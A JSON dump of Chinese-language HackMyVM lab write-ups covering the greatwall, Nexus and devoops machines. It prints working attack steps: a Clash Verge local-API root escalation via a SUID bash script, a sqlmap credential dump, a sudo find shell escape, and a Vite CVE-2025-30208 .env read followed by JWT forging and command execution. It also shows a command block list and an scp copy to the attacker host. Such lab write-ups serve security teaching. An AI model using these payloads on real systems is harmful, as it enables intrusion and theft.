600 id_rsa\n   \u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n   \u2514\u2500$ ssh wall@192.168.205.131 -i /tmp/id_rsa\n   Linux greatwall 6.1.0-32-amd64 ...\n   wall@greatwall:~$ id\n   uid=1000(wall) gid=1000(wall) groups=1000(wall)...\n   ```\n\n\u6210\u529f\u767b\u5f55\u540e\uff0c\u6211\u4eec\u83b7\u5f97\u4e86 `wall` \u7528\u6237\u7684\u4ea4\u4e92\u5f0fShell\u3002\n\n## **3.2. wall -> root**\n\n\u767b\u5f55`wall`\u7528\u6237\u540e\uff0c\u518d\u6b21\u68c0\u67e5`sudo`\u6743\u9650\u3002\n\n```shell\nwall@greatwall:~$ sudo -l\nMatching Defaults entries for wall on greatwall:\n    ...\nUser wall may run the following commands on greatwall:\n    (ALL) NOPASSWD: /usr/bin/systemctl start clash-verge-service\n```\n\n\u53d1\u73b0 `wall` \u7528\u6237\u53ef\u4ee5\u65e0\u5bc6\u7801\u542f\u52a8 `clash-verge-service` \u670d\u52a1\u3002\u8fd9\u4e0e\u8fd1\u671f\u62ab\u9732\u7684 **Clash Verge \u6743\u9650\u63d0\u5347\u6f0f\u6d1e**\u7279\u5f81\u76f8\u7b26\u3002\n\n> [!Tip]\n>\n> https://mp.weixin.qq.com/s/fwIPGN79kf6_VAGkJOmz7w\n\n**\u6f0f\u6d1e\u539f\u7406\u7b80\u6790**:\nClash Verge \u5728\u901a\u8fc7 `systemctl` \u542f\u52a8\u670d\u52a1\u65f6\uff0c\u4f1a\u76d1\u542c\u4e00\u4e2a\u672c\u5730\u7684HTTP\u63a5\u53e3\uff08\u9ed8\u8ba4\u4e3a `127.0.0.1:33211`\uff09\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5411\u8be5\u63a5\u53e3\u7684 `/start_clash` \u8def\u5f84\u53d1\u9001\u4e00\u4e2a\u6076\u610f\u7684POST\u8bf7\u6c42\u3002\u8bf7\u6c42\u4f53\u4e2d\u7684 `bin_path` \u53c2\u6570\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2a\u672c\u5730\u7684\u53ef\u6267\u884c\u6587\u4ef6\u8def\u5f84\uff0c\u670d\u52a1\u4f1a\u4ee5`root`\u6743\u9650\u6267\u884c\u8fd9\u4e2a\u6587\u4ef6\u3002\u8fd9\u5c31\u9020\u6210\u4e86\u4e00\u4e2a\u672c\u5730\u6743\u9650\u63d0\u5347\u6f0f\u6d1e\u3002\n\n**\u5229\u7528\u6b65\u9aa4**:\n\n1. **\u542f\u52a8\u6f0f\u6d1e\u670d\u52a1**: \u4f7f\u7528 `sudo` \u542f\u52a8\u670d\u52a1\uff0c\u6fc0\u6d3b\u6f0f\u6d1e\u63a5\u53e3\u3002\n\n   ```shell\n   wall@greatwall:~$ sudo /usr/bin/systemctl start clash-verge-service\n   ```\n\n2. **\u9a8c\u8bc1\u670d\u52a1\u76d1\u542c**: \u4f7f\u7528 `ss` \u547d\u4ee4\u786e\u8ba4\u670d\u52a1\u5df2\u5728\u672c\u5730 `33211` \u7aef\u53e3\u76d1\u542c\u3002\n\n   ```shell\n   wall@greatwall:~$ ss -tnlp\n   State      Recv-Q     Send-Q         Local Address:Port      Peer Address:Port\n   ...\n   LISTEN     0          128                127.0.0.1:33211          0.0.0.0:*\n   ...\n   ```\n\n3. **\u521b\u5efa\u63d0\u6743\u811a\u672c**: \u5728 `/tmp` \u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u811a\u672c `a.sh`\uff0c\u5176\u529f\u80fd\u662f\u4e3a `/bin/bash` \u6dfb\u52a0SUID\u6743\u9650\u4f4d\uff0c\u5e76\u8d4b\u4e88\u5176\u6267\u884c\u6743\u9650\u3002\n\n   ```shell\n   wall@greatwall:/tmp$ cat > a.sh << EOF\n   #!/bin/bash\n   chmod +s /bin/bash\n   EOF\n   wall@greatwall:/tmp$ chmod +x a.sh\n   ```\n\n4. **\u53d1\u9001\u6076\u610f\u8bf7\u6c42**: \u4f7f\u7528 `curl` \u5411\u672c\u5730 `33211` \u7aef\u53e3\u7684 `/start_clash` \u63a5\u53e3\u53d1\u9001POST\u8bf7\u6c42\uff0c\u901a\u8fc7 `bin_path` \u53c2\u6570\u6307\u5b9a\u6267\u884c\u6211\u4eec\u521a\u521a\u521b\u5efa\u7684 `/tmp/a.sh` \u811a\u672c\u3002\n\n   ```shell\n   wall@greatwall:/tmp$ curl -X POST 'http://127.0.0.1:33211/start_clash' \\\n   -H 'Content-Type: application/json' \\\n   -d '{'bin_path': '/tmp/a.sh', 'config_dir': '', 'config_file': '', 'log_file': '/dev/null'}'\n   \n   {'code':0,'msg':'ok','data':null}\n   ```\n\n5. **\u83b7\u53d6Root Shell**: \u68c0\u67e5 `/bin/bash` \u7684\u6743\u9650\uff0c\u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u6dfb\u52a0\u4e86SUID\u4f4d\u3002\u6b64\u65f6\u6267\u884c `bash -p` \u5373\u53ef\u83b7\u5f97\u4e00\u4e2a `euid` \u4e3a `root` \u7684shell\u3002\n\n   ```shell\n   wall@greatwall:/tmp$ ls -la /bin/bash\n   -rwsr-sr-x 1 root root 1265648 Mar 30  2024 /bin/bash\n   wall@greatwall:/tmp$ bash -p\n   bash-5.2# id\n   uid=1000(wall) gid=1000(wall) euid=0(root) egid=0(root) groups=0(root)...\n   ```\n\n6. **\u8bfb\u53d6Flag**: \u81f3\u6b64\uff0c\u6211\u4eec\u5df2\u6210\u529f\u63d0\u6743\u81f3root\uff0c\u53ef\u4ee5\u8bfb\u53d6\u6240\u6709flag\u3002\n\n   ```shell\n   bash-5.2# cat /root/r007.7x7oZzZzZzzzz /home/wall/user.flag\n   flag{b3d2a9f34869484b74db97411cf1eb3b}\n   flag{b088764475fa2a0a962fb9154f41c5b6}\n   ```sentence", "top": 0, "createdAt": 1756021046, "style": "<style>.markdown-alert{padding:0.5rem 1rem;margin-bottom:1rem;border-left:.25em solid var(--borderColor-default,var(--color-border-default));}.markdown-alert .markdown-alert-title {display:flex;font-weight:var(--base-text-weight-medium,500);align-items:center;line-height:1;}.markdown-alert>:first-child {margin-top:0;}.markdown-alert>:last-child {margin-bottom:0;}</style><style>.markdown-alert.markdown-alert-tip {border-left-color:var(--borderColor-success-emphasis, var(--color-success-emphasis));background-color:var(--color-success-subtle);}.markdown-alert.markdown-alert-tip .markdown-alert-title {color: var(--fgColor-success,var(--color-success-fg));}</style>", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-24", "dateLabelColor": "#0969da"}, "P231": {"htmlDir": "docs/post/hmv_Nexus.html", "labels": ["HackMyVM"], "postTitle": "hmv_Nexus", "postUrl": "post/hmv_Nexus.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/231", "commentNum": 0, "wordCount": 4362, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n\u9996\u5148\uff0c\u5728\u5f53\u524d\u7f51\u6bb5\u5185\u8fdb\u884c\u4e3b\u673a\u53d1\u73b0\uff0c\u786e\u5b9a\u76ee\u6807\u9776\u673a\u7684IP\u5730\u5740\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n...\n192.168.205.132 08:00:27:99:80:8f       PCS Systemtechnik GmbH\n...\n```\n\n\u76ee\u6807\u4e3b\u673aIP\u4e3a `192.168.205.132`\u3002\n\n\u63a5\u4e0b\u6765\uff0c\u4f7f\u7528Nmap\u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u63a2\u6d4b\u5176\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p0-65535 192.168.205.132\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 05:04 EDT\nNmap scan report for novice.com (192.168.205.132)\nHost is up (0.00017s latency).\nNot shown: 65534 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:99:80:8F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.12 seconds\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0c\u76ee\u6807\u5f00\u653e\u4e86 `22` (SSH) \u548c `80` (HTTP) \u4e24\u4e2a\u7aef\u53e3\u3002\u6211\u4eec\u4eceWeb\u670d\u52a1\u5165\u624b\u3002\n\n# \u4e8c\u3001Web\u6e17\u900f\n\n\u8bbf\u95ee\u76ee\u6807 `http://192.168.205.132`\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u9759\u6001\u56fe\u7247\u5c55\u793a\u9875\u9762\uff0c\u6ca1\u6709\u53ef\u4ea4\u4e92\u7684\u529f\u80fd\u70b9\u3002\u56e0\u6b64\uff0c\u51b3\u5b9a\u8fdb\u884c\u76ee\u5f55\u7206\u7834\u6765\u53d1\u73b0\u66f4\u591a\u4fe1\u606f\u3002\n\n\u4f7f\u7528 `gobuster` \u8fdb\u884c\u76ee\u5f55\u626b\u63cf\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.132 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -t 64\n===============================================================\n...\n[+] Url:                     http://192.168.205.132\n...\n===============================================================\n/index.html           (Status: 200) [Size: 825]\n/login.php            (Status: 200) [Size: 352]\n/index2.php           (Status: 200) [Size: 75134]\n/server-status        (Status: 403) [Size: 280]\n...\n===============================================================\n```\n\n\u626b\u63cf\u53d1\u73b0\u4e86 `index2.php` \u548c `login.php`\u3002\u8bbf\u95ee `index2.php`\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u529f\u80fd\u590d\u6742\u7684\u4eff\u9ed1\u5ba2\u4ea4\u4e92\u5f0f\u9875\u9762\u3002\u5728\u9875\u9762\u7684 'CRYPTO' \u6a21\u5757\u4e2d\uff0c\u627e\u5230\u4e86\u4e00\u6bb5\u5341\u516d\u8fdb\u5236\u7f16\u7801\u7684\u5b57\u7b26\u4e32\uff1a\n\n```\n48 6f 6c 61 20 41 6c 69 74 61 2c 20 ... 6c 61 20 72 65 64 2e\n```\n\n\u4f7f\u7528 CyberChef \u5c06\u5176\u8f6c\u6362\u4e3a\u6587\u672c\uff0c\u5f97\u5230\u4ee5\u4e0b\u4fe1\u606f\uff1a\n\n> \u55e8\uff0cAlita\uff0c\u5e0c\u671b\u4f60\u6b63\u5728\u8bfb\u8fd9\u6761\u52a0\u5bc6\u4fe1\u606f\u3002\u8981\u7834\u89e3\u7cfb\u7edf\uff0c\u4f60\u9700\u8981\u4f7f\u7528\u6211\u89e3\u91ca\u8fc7\u7684\u6280\u672f\u3002\u6211\u5df2\u7ecf\u628a\u8bbf\u95ee\u4ee3\u7801\u548c\u9a8c\u8bc1\u7801\u201cpandora\u201d\u7ed9\u4e86\u4f60\u3002\u7ebf\u4e0a\u89c1\u3002\n\n\u867d\u7136\u5f97\u5230\u4e86 \u201cpandora\u201d \u8fd9\u4e2a\u5173\u952e\u4fe1\u606f\uff0c\u4f46\u5f53\u65f6\u5e76\u672a\u5b8c\u5168\u7406\u89e3\u5176\u7528\u9014\u3002\n\n\u7ee7\u7eed\u63a2\u7d22 `index2.php` \u7684\u5176\u4ed6\u6a21\u5757\uff0c\u5728 'NEXUS' \u6a21\u5757\u4e2d\u53d1\u73b0\u4e86\u4e00\u6761\u91cd\u8981\u7684\u63d0\u793a\u4fe1\u606f\uff0c\u6307\u5411\u4e86\u4e00\u4e2a\u65b0\u7684\u767b\u5f55\u8def\u5f84\uff1a\n\n![image-20250824172310725](http://7r1UMPHK.github.io/image/20250824174142762.webp)\n\n`NEXUS MSG> _ AUTHORIZATION PANEL :: http://[personal ip]/auth-login.php`\n\n\u8bbf\u95ee `http://192.168.205.132/auth-login.php`\uff0c\u53d1\u73b0\u4e00\u4e2a\u767b\u5f55\u6846\u3002\u5c1d\u8bd5\u8f93\u5165 `admin` \u5e76\u5728\u5bc6\u7801\u6846\u4e2d\u8f93\u5165\u4e00\u4e2a\u5355\u5f15\u53f7 `'`\uff0c\u9875\u9762\u8fd4\u56de\u4e86SQL\u9519\u8bef\uff0c\u8868\u660e\u6b64\u5904\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002\n\n\u4f7f\u7528 `sqlmap` \u5bf9\u8be5\u767b\u5f55\u8868\u5355\u8fdb\u884c\u81ea\u52a8\u5316\u6ce8\u5165\u653b\u51fb\uff1a\n\n```bash\nsqlmap -u 'http://192.168.205.132/auth-login.php' --batch --forms --dump\n```\n\n`sqlmap` \u6210\u529f\u8bc6\u522b\u5e76\u5229\u7528\u4e86\u6ce8\u5165\u70b9\uff0c\u4ece\u6570\u636e\u5e93\u4e2d dump \u51fa\u4e86 `users` \u8868\u7684\u5185\u5bb9\uff1a\n\n```\n...\nDatabase: sion\nTable: users\n[2 entries]\n+----+--------------------+----------+\n| id | password           | username |\n+----+--------------------+----------+\n| 1  | F4ckTh3F4k3H4ck3r5 | shelly   |\n| 2  | cambiame08         | admin    |\n+----+--------------------+----------+\n...\n```\n\n\u6211\u4eec\u83b7\u5f97\u4e86\u4e00\u7ec4\u6709\u6548\u7684\u51ed\u8bc1\uff1a`shelly` / `F4ckTh3F4k3H4ck3r5`\u3002\n\n# \u4e09\u3001\u6743\u9650\u63d0\u5347\n\n\u5229\u7528\u4e0a\u4e00\u6b65\u83b7\u53d6\u7684\u51ed\u8bc1\uff0c\u901a\u8fc7SSH\u767b\u5f55\u76ee\u6807\u4e3b\u673a\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ssh shelly@192.168.205.132\nshelly@192.168.205.132's password: F4ckTh3F4k3H4ck3r5\n\n... Welcome Banner ...\n\nshelly@NexusLabCTF:~$ id\nuid=1000(shelly) gid=1000(shelly) groups=1000(shelly)...\n```\n\n\u767b\u5f55\u6210\u529f\u540e\uff0c\u7acb\u5373\u68c0\u67e5\u5f53\u524d\u7528\u6237\u7684 `sudo` \u6743\u9650\u3002\n\n```bash\nshelly@NexusLabCTF:~$ sudo -l\n...\nUser shelly may run the following commands on NexusLabCTF:\n    (ALL) NOPASSWD: /usr/bin/find\n```\n\n\u7ed3\u679c\u663e\u793a\uff0c`shelly` \u7528\u6237\u53ef\u4ee5\u65e0\u9700\u5bc6\u7801\u4ee5 `root` \u6743\u9650\u6267\u884c `/usr/bin/find` \u547d\u4ee4\u3002`find` \u547d\u4ee4\u53ef\u4ee5\u901a\u8fc7 `-exec` \u53c2\u6570\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff0c\u8fd9\u662f\u4e00\u4e2a\u7ecf\u5178\u7684\u63d0\u6743\u5411\u91cf\u3002\n\n\u5229\u7528 `find` \u547d\u4ee4\u63d0\u6743\u81f3 `root`\uff1a\n\n```bash\nshelly@NexusLabCTF:~$ sudo find . -exec /bin/bash \\; -quit\nroot@NexusLabCTF:/home/shelly# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n\u6210\u529f\u83b7\u53d6 `root` \u6743\u9650\u3002\u9996\u5148\uff0c\u8bfb\u53d6\u7528\u6237 flag\uff1a\n\n```bash\nroot@NexusLabCTF:/home/shelly# cat /home/shelly/SA/user-flag.txt \n...\nHackMyVM\nFlag User ::  82kd8FJ5SJ00HMVUS3R36gd\n```\n\n# \u56db\u3001\u6700\u7ec8Flag\u83b7\u53d6\n\n\u5728 `root` \u7528\u6237\u7684\u5bb6\u76ee\u5f55\u4e0b\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u540d\u4e3a `Sion-Code` \u7684\u76ee\u5f55\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2a\u56fe\u7247\u6587\u4ef6 `use-fim-to-root.png`\u3002\u6587\u4ef6\u540d\u6697\u793a\u4e86\u6700\u7ec8\u7684 flag \u53ef\u80fd\u4e0e\u8fd9\u4e2a\u6587\u4ef6\u6709\u5173\u3002\n\n\u4e3a\u4e86\u65b9\u4fbf\u5206\u6790\uff0c\u4f7f\u7528 `scp` \u5c06\u8be5\u56fe\u7247\u6587\u4ef6\u4f20\u56de Kali \u653b\u51fb\u673a\u3002\n\n```bash\n# \u5728\u9776\u673a\u4e0a\u6267\u884c\nroot@NexusLabCTF:~/Sion-Code# scp use-fim-to-root.png kali@192.168.205.128:/mnt/hgfs/gx/x\n...\nuse-fim-to-root.png                                     100%   71KB  19.7MB/s   00:00\n```\n\n![use-fim-to-root](http://7r1UMPHK.github.io/image/20250824174140496.webp)\n\n\u56de\u5230 Kali\uff0c\u4f7f\u7528 `strings` \u547d\u4ee4\u68c0\u67e5\u56fe\u7247\u6587\u4ef6\u4e2d\u662f\u5426\u9690\u85cf\u4e86\u53ef\u6253\u5370\u7684\u5b57\u7b26\u4e32\u3002\u8fd9\u79cd\u65b9\u6cd5\u5e38\u7528\u4e8e\u5728\u6587\u4ef6\u4e2d\u5bfb\u627e\u88ab\u9690\u85cf\u7684\u4fe1\u606f\uff08\u4e00\u79cd\u7b80\u5355\u7684\u9690\u5199\u672f\uff09\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ strings use-fim-to-root.png | tail -n 1\n;HMV-FLAG[[ p3vhKP9d97a7HMV79ad9ks2s9 ]]\n```\n\n\u5728\u6587\u4ef6\u7684\u672b\u5c3e\u6210\u529f\u627e\u5230\u4e86\u6700\u7ec8\u7684 root flag\u3002\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1756028533, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-24", "dateLabelColor": "#0969da"}, "P232": {"htmlDir": "docs/post/hmv_devoops.html", "labels": ["HackMyVM"], "postTitle": "hmv_devoops", "postUrl": "post/hmv_devoops.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/232", "commentNum": 0, "wordCount": 10250, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n\u9996\u5148\uff0c\u4f7f\u7528`arp-scan`\u5de5\u5177\u5bf9\u5f53\u524d\u5c40\u57df\u7f51\u8fdb\u884c\u626b\u63cf\uff0c\u4ee5\u53d1\u73b0\u5b58\u6d3b\u4e3b\u673a\u5e76\u786e\u5b9a\u9776\u673a\u7684IP\u5730\u5740\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l                               \n[sudo] kali \u7684\u5bc6\u7801\uff1a\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n...\n192.168.205.149 08:00:27:df:47:90       PCS Systemtechnik GmbH\n...\n```\n\n\u53d1\u73b0\u76ee\u6807\u4e3b\u673aIP\u4e3a `192.168.205.149`\u3002\n\n\u63a5\u7740\uff0c\u4f7f\u7528`nmap`\u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u63a2\u6d4b\u5176\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p0-65535 192.168.205.149\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 07:29 EDT\nNmap scan report for 192.168.205.149\nHost is up (0.00020s latency).\nNot shown: 65535 closed tcp ports (reset)\nPORT     STATE SERVICE\n3000/tcp open  ppp\nMAC Address: 08:00:27:DF:47:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.43 seconds\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0c\u76ee\u6807\u4e3b\u673a\u4ec5\u5f00\u653e\u4e86 3000 \u7aef\u53e3\u3002\n\n\u4f7f\u7528`curl`\u8bbf\u95ee\u8be5\u7aef\u53e3\u63d0\u4f9b\u7684Web\u670d\u52a1\uff0c\u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.149:3000                                                               \n<!doctype html>\n<html lang='en'>\n  <head>\n    <script type='module' src='/@vite/client'></script>\n...\n    <title>Vite + Vue</title>\n...\n    <script type='module' src='/src/main.js'></script>\n...\n</html>\n```\n\n\u4ece\u8fd4\u56de\u7684HTML\u5185\u5bb9\u53ef\u4ee5\u5224\u65ad\uff0c\u8fd9\u662f\u4e00\u4e2a\u57fa\u4e8e Vite \u548c Vue \u6784\u5efa\u7684\u524d\u7aef\u9879\u76ee\u3002Vite \u662f\u4e00\u4e2a\u73b0\u4ee3\u5316\u7684\u524d\u7aef\u6784\u5efa\u5de5\u5177\uff0c\u5176\u5728\u5f00\u53d1\u6a21\u5f0f\u4e0b\u4f1a\u63d0\u4f9b\u4e00\u4e2a\u5f00\u53d1\u670d\u52a1\u5668\u3002\n\n# **\u4e8c\u3001\u6f0f\u6d1e\u53d1\u73b0\u4e0e\u5229\u7528**\n\n\u5c1d\u8bd5\u8bfb\u53d6\u8be5Vite\u9879\u76ee\u7684\u914d\u7f6e\u6587\u4ef6`vite.config.js`\uff0c\u4ee5\u4e86\u89e3\u5176\u540e\u7aef\u4ee3\u7406\u548c\u5b89\u5168\u8bbe\u7f6e\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.149:3000/vite.config.js \nimport { defineConfig } from '/node_modules/.vite/deps/vite.js?v=4e07dcb1'\n...\nexport default defineConfig({\n  plugins: [vue()],\n  server: {\n    proxy: {\n      '/sign': {\n        target: 'http://localhost:3001',\n        changeOrigin: true,\n        rewrite: (path) => path.replace(/^\\/sign/, '/api/sign')\n      },\n      '/execute': {\n        target: 'http://localhost:3001',\n        changeOrigin: true,\n        rewrite: (path) => path.replace(/^\\/execute/, '/api/execute')\n      }\n    },\n    fs: {\n      deny: ['.env', '.env.*', '*.{crt,pem}', '**/.git/**', 'package.json'],\n    }\n  },\n})\n```\n\n\u914d\u7f6e\u6587\u4ef6\u66b4\u9732\u4e86\u4e24\u4e2aAPI\u4ee3\u7406\u8def\u5f84 `/sign` \u548c `/execute`\uff0c\u5b83\u4eec\u90fd\u88ab\u8f6c\u53d1\u5230\u672c\u5730\u7684 `http://localhost:3001` \u670d\u52a1\u3002\u540c\u65f6\uff0c`fs.deny` \u914d\u7f6e\u9879\u8bd5\u56fe\u963b\u6b62\u5bf9 `.env` \u7b49\u654f\u611f\u6587\u4ef6\u7684\u76f4\u63a5\u8bbf\u95ee\u3002\n\n\u7ee7\u7eed\u8bfb\u53d6\u540e\u7aef\u670d\u52a1\u7684\u4e3b\u903b\u8f91\u6587\u4ef6 `server.js`\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.149:3000/server.js\n...\napp.get('/api/sign', (req, res) => {\n    return res.json({\n        'status': 'signed',\n        'data': jwt.sign({\n            uid: -1,\n            role: 'guest',\n        }, process.env.JWT_SECRET, { expiresIn: '1800s' }),\n    });\n});\n\napp.get('/api/execute', async (req, res) => {\n...\n    try {\n        const payload = jwt.verify(jwt_raw, process.env.JWT_SECRET);\n        if (payload.role !== 'admin') {\n...\n    const command = req.query.cmd;\n\n    const is_command_safe = is_safe_command(command);\n...\n});\n...\n```\n\n\u4ee3\u7801\u5ba1\u8ba1\u53d1\u73b0\uff1a\n\n1.  `/api/sign` \u63a5\u53e3\u4f7f\u7528 `process.env.JWT_SECRET` \u4f5c\u4e3a\u5bc6\u94a5\uff0c\u7b7e\u53d1\u4e00\u4e2a\u89d2\u8272\u4e3a `guest` \u7684JWT\u3002\n2.  `/api/execute` \u63a5\u53e3\u8981\u6c42\u8bf7\u6c42\u5934\u4e2d\u5305\u542b\u6709\u6548\u7684JWT\uff0c\u5e76\u9a8c\u8bc1\u5176 `role` \u662f\u5426\u4e3a `admin`\uff0c\u4e4b\u540e\u4f1a\u6267\u884c `cmd` \u53c2\u6570\u4f20\u5165\u7684\u547d\u4ee4\u3002\n\n\u5c3d\u7ba1 `vite.config.js` \u4e2d\u914d\u7f6e\u4e86 `fs.deny`\uff0c\u4f46 Vite \u5728\u67d0\u4e9b\u7248\u672c\u4e2d\u5b58\u5728\u76ee\u5f55\u904d\u5386\u548c\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff08\u6b64\u9776\u673a\u73af\u5883\u4e2d\u4e3a**CVE-2025-30208**\uff09\uff0c\u53ef\u4ee5\u7ed5\u8fc7\u8be5\u9650\u5236\u3002\u901a\u8fc7\u7279\u5b9apayload\u53ef\u4ee5\u8bfb\u53d6\u5230 `.env` \u6587\u4ef6\u5185\u5bb9\u3002\n\n> [!Tip]\n>\n> https://github.com/ThumpBo/CVE-2025-30208-EXP\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl -s 'http://192.168.205.149:3000/opt/node/.env?import&raw??'\nexport default 'JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'\\nCOMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&,<,>,ls,cat,pwd,head,tail,grep,xxd'\\n'\n```\n\n\u6210\u529f\u83b7\u53d6\u5230 `JWT_SECRET`\uff1a`2942szKG7Ev83aDviugAa6rFpKixZzZz`\uff0c\u4ee5\u53ca\u547d\u4ee4\u6267\u884c\u7684\u9ed1\u540d\u5355 `COMMAND_FILTER`\u3002\n\n\u5229\u7528\u83b7\u53d6\u5230\u7684 `JWT_SECRET`\uff0c\u6211\u4eec\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2a\u89d2\u8272\u4e3a `admin` \u7684JWT\u3002\u53ef\u4ee5\u8bbf\u95ee [[jwt.cagdastunca.com](https://jwt.cagdastunca.com/)](https://jwt.cagdastunca.com/) \u6216\u5176\u4ed6JWT\u5de5\u5177\u6765\u5b8c\u6210\u6b64\u64cd\u4f5c\u3002\n\n**\u4f2a\u9020\u7684Payload:**\n\n```json\n{\n  'uid': -1,\n  'role': 'admin',\n  'iat': 1756035331,\n  'exp': 1756037131\n}\n```\n\n**\u751f\u6210\u7684Admin Token:**\n`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NTYwMzUzMzEsImV4cCI6MTc1NjAzNzEzMX0.meJBbQUW_wJiQBM7FBtF6IIdP0SJrD5Z_tXJoRr6yi0`\n\n\u4f7f\u7528\u4f2a\u9020\u7684Token\u5c1d\u8bd5\u6267\u884c `id` \u547d\u4ee4\uff0c\u9a8c\u8bc1\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff08RCE\uff09\u662f\u5426\u6210\u529f\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ADMIN_TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NTYwMzUzMzEsImV4cCI6MTc1NjAzNzEzMX0.meJBbQUW_wJiQBM7FBtF6IIdP0SJrD5Z_tXJoRr6yi0'\n      \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl -g -H 'Authorization: Bearer $ADMIN_TOKEN' 'http://192.168.205.149:3000/execute?cmd=id'\n{'status':'executed','data':{'stdout':'uid=1000(runner) gid=1000(runner) groups=1000(runner)\\n','stderr':''}}\n```\n\n\u547d\u4ee4\u6210\u529f\u6267\u884c\uff0c\u5f53\u524d\u7528\u6237\u4e3a `runner`\u3002\n\n# **\u4e09\u3001\u83b7\u53d6\u53cd\u5f39Shell**\n\n\u4e3a\u4e86\u83b7\u5f97\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u7684Shell\uff0c\u6211\u4eec\u51c6\u5907\u8fdb\u884c\u53cd\u5f39Shell\u64cd\u4f5c\u3002\u901a\u8fc7\u6267\u884c `busybox` 